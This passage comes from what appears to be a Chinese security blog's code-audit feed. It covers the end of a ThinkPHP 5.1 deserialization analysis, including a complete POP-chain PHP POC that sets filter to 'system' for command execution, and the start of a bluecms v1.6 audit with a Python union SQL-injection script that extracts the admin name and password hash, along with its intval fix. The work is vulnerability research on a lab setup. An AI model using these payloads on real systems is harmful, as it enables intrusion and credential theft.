$default);</code>相当于是<code>$filter=$this-&gt;filter</code>,而<code>$this-&gt;filter</code>可控，故<code>$filter</code>可控。</p><p>但这里的data数组不可控，如果可控，且<code>$name</code>是空字符串，$data就直接作为回调函数的可控参数</p><p>接下来看看有没有哪些地方调用了input函数，它的$data这个位置的参数是否可控</p><p>同样也是在Request类中，有一个param函数满足要求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">        <span class="variable">$method</span> = <span class="keyword">$this</span>-&gt;method(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                <span class="variable">$vars</span> = <span class="keyword">$this</span>-&gt;post(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                <span class="variable">$vars</span> = <span class="keyword">$this</span>-&gt;put(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="variable">$vars</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="keyword">$this</span>-&gt;route(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        <span class="variable">$data</span> = is_array(<span class="variable">$file</span>) ? array_merge(<span class="keyword">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后这里使用了input函数，注意<code>$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</code>也就是注释中说的<code>$this-&gt;param</code>会和URL地址中的参数合并</p><p>因为调用的是<code>array_walk_recursive()</code>，数组中每个成员都可以被调用到，故无影响。</p><p>参数<code>$this-&gt;param</code>可控，相当于<code>$data</code>可控，但考虑动态执行命令，就不直接构造<code>$this-&gt;param</code>,可以把要执行的命令写在get参数里。</p><p>第二个参数<code>$name</code>还不可控，寻找有无调用param函数的地方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span>(<span class="params"><span class="variable">$ajax</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$value</span>  = <span class="keyword">$this</span>-&gt;server(<span class="string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;xmlhttprequest&#x27;</span> == strtolower(<span class="variable">$value</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$ajax</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span>           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]) ? <span class="literal">true</span> : <span class="variable">$result</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mergeParam = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在isAjax函数中，<code>$this-&gt;config[&#39;var_ajax&#39;]</code>可控，相当于param函数中<code>$name</code>可控，再相当于input函数中<code>$name</code>可控</p><p>让<code>$this-&gt;config[&#39;var_ajax&#39;]</code>为空，即input函数中<code>$name</code>为空，加上<code>$data</code>可控，故</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_walk_recursive(<span class="variable">$data</span>, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br></pre></td></tr></table></figure><p>这个回调函数中的参数可控</p><p>进而filterValue中的<code>$value = call_user_func($filter, $value);</code>，其回调函数和参数也都可控了</p><h1 id="利用链梳理"><a href="#利用链梳理" class="headerlink" title="利用链梳理"></a>利用链梳理</h1><p>pop利用链：</p><p>Windows类的__destruct()→</p><p>Windows类的removeFiles()→</p><p>file_exists()→</p><p>Model类的__toString()→</p><p>Model类的toJson()→</p><p>Model类的toArray()→</p><p>Request类的__call()→</p><p>Request类的filterValue()→</p><p>Request类的input()→</p><p>Request类的param()→</p><p>Request类的isAjax()</p><h1 id="POC梳理"><a href="#POC梳理" class="headerlink" title="POC梳理"></a>POC梳理</h1><p>POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files[]=<span class="keyword">new</span> Pivot();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data=<span class="keyword">array</span>(</span><br><span class="line">              <span class="string">&#x27;cmd&#x27;</span>=&gt;<span class="keyword">new</span> Request()</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">$this</span>-&gt;append=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;cmd&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPS代理标识</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IP代理获取标识</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URL伪静态后缀</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="keyword">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>创建一个Windows()对象，触发Windows类的<code>__construct()</code>方法</p></li><li><p>上一步的<code>__construct()</code>方法中创建了一个Pivot()对象，它继承自Model()类，触发Model()类的<code>__construct()</code>方法</p></li><li><p>上一步的<code>__construct()</code>方法中创建了一个Request()对象，触发Request类的<code>__construct()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="keyword">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line"> <span class="keyword">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上一步的<code>__construct()</code>方法调用了Request类中不存在的visible()方法，触发<code>__call()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span></span><br><span class="line">//$method为不存在的方法，$args为不存在方法以数组形式存的参数，</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (array_key_exists(<span class="variable">$method</span>, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">    array_unshift(<span class="variable">$args</span>, <span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[<span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">        <span class="comment">//执行[$this,&#x27;isAjax&#x27;]</span></span><br><span class="line">   &#125;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>__call()</code>方法中执行<code>call_user_func_array()</code>方法</p></li><li><p>执行回调函数isAjax()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span>(<span class="params"><span class="variable">$ajax</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">        <span class="variable">$result</span>= <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]) ? <span class="literal">true</span> : <span class="variable">$result</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>执行param()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......       </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    <span class="comment">//$this-&gt;param以get方法提交</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>执行input()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            array_walk_recursive(<span class="variable">$data</span>, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">            <span class="comment">//$data相当于$this-&gt;param,$filter为system</span></span><br><span class="line">......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>执行filterValue()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> .......</span><br><span class="line">    <span class="variable">$value</span> = call_user_func(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">    <span class="comment">//$filter为system，$value即$data</span></span><br></pre></td></tr></table></figure><h1 id="验证POC"><a href="#验证POC" class="headerlink" title="验证POC"></a>验证POC</h1></li></ol><p>首先构造一个利用点，这个漏洞就是需要后期开发的时候有利用点，才能触发</p><p>/public/index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Container::get(<span class="string">&#x27;app&#x27;</span>)-&gt;run()-&gt;send();</span><br><span class="line"><span class="variable">$str</span> = base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">unserialize(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><p>把payload通过POST传过去，然后通过GET请求获取需要执行的命令</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210906171047508.png" alt="image-20210906171047508"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12639659.html#autoid-0-5-0">https://www.cnblogs.com/wangtanzhi/p/12639659.html#autoid-0-5-0</a></p><p><a href="https://paper.seebug.org/1040/#_2">https://paper.seebug.org/1040/#_2</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/113843768">https://blog.csdn.net/rfrder/article/details/113843768</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bluecms v1.6审计</title>
      <link href="posts/56705.html"/>
      <url>posts/56705.html</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li><p>bluecms v1.6源码</p><p><a href="https://github.com/source-trace/bluecms">https://github.com/source-trace/bluecms</a></p></li><li><p>Seay源代码审计系统 </p><p>链接：<a href="http://pan.baidu.com/s/1dENS4KT#rszt">http://pan.baidu.com/s/1dENS4KT</a> 密码：rszt</p></li><li><p>phpStudy2018 PHP-5.4.45</p></li></ul><p>按理说访问网站主目录下的<code>/install</code>就能进入安装页面，但我访问后却显示空白，无法进行安装。经过搜索，找到了解决办法：在phpstudy设置中打开允许目录列表，并且在 <code>\install\compile</code> 目录下删掉<code>%%37^37A^37A968E3%%step1.htm.php</code>文件，再访问一次安装地址就可以了。接下来按照提示进行数据库配置即可成功搭建。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818102132490.png" alt="image-20210818102132490"></p><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>Seay源代码审计系统自动审计结果</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818102733659.png" alt="image-20210818102733659"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p><code>ad_js.php</code></p><p>定位到这里，发现<code>$_GET[&#39;ad_id&#39;]</code>参数除了trim去掉两边空格外没有其他的过滤，而包含的<code>common.inc.php</code>中对<code>$_GET</code>进行了<code>addslashes</code>过滤，但由于SQL语句中的变量没有使用单引号保护，<code>addslashes</code> 也就失去了作用，故存在sql注入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ad_id</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) ? trim(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$ad_id</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Error!&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ad</span> = <span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT * FROM &quot;</span>.table(<span class="string">&#x27;ad&#x27;</span>).<span class="string">&quot; WHERE ad_id =&quot;</span>.<span class="variable">$ad_id</span>);</span><br></pre></td></tr></table></figure><p>getone函数，执行传入的sql语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$type</span>=MYSQL_ASSOC</span>)</span>&#123;</span><br><span class="line"><span class="variable">$query</span> = <span class="keyword">$this</span>-&gt;query(<span class="variable">$sql</span>,<span class="keyword">$this</span>-&gt;linkid);</span><br><span class="line">   <span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, <span class="variable">$type</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$row</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对提交的参数进行过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$_POST</span> = install_deep_addslashes(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$_GET</span> = install_deep_addslashes(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="variable">$_COOKIES</span> = install_deep_addslashes(<span class="variable">$_COOKIES</span>);</span><br><span class="line"><span class="variable">$_REQUEST</span> = install_deep_addslashes(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.47.128/bluecms/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://192.168.47.128/bluecms/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x626c75655f61646d696e&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://192.168.47.128/bluecms/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x7e,pwd) from blue_admin&quot;</span></span><br><span class="line">result=requests.get(url=url).text</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;!--document.write(&quot;admin~21232f297a57a5a743894a0e4a801fc3&quot;);--&gt;</span></span><br></pre></td></tr></table></figure><p>修复方式</p><p>把语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ad_id</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) ? trim(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ad_id</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) ? intval(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>函数intval（）–&gt; 